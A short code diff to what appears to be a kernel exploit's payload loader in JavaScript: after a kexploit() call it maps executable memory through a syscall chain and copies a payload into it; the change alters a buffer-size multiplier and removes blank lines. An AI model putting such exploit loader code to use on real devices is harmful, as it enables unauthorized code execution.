@@ -1821,7 +1821,7 @@ kexploit().then(() => {
 
     var payload_buffer = chain.sysp('mmap', window.pld_size, 0x300000, 7, 0x41000, -1, 0);
     var payload = window.pld;
-    var bufLen = payload.length * 4
+    var bufLen = payload.length * 5
     var payload_loader = malloc32(bufLen);
     var loader_writer = payload_loader.backing;
     for (var i = 0; i < payload.length; i++) {
@@ -1837,9 +1837,4 @@ kexploit().then(() => {
         payload_loader,
         payload_buffer,
     );
-
-
-    
-
-
 })
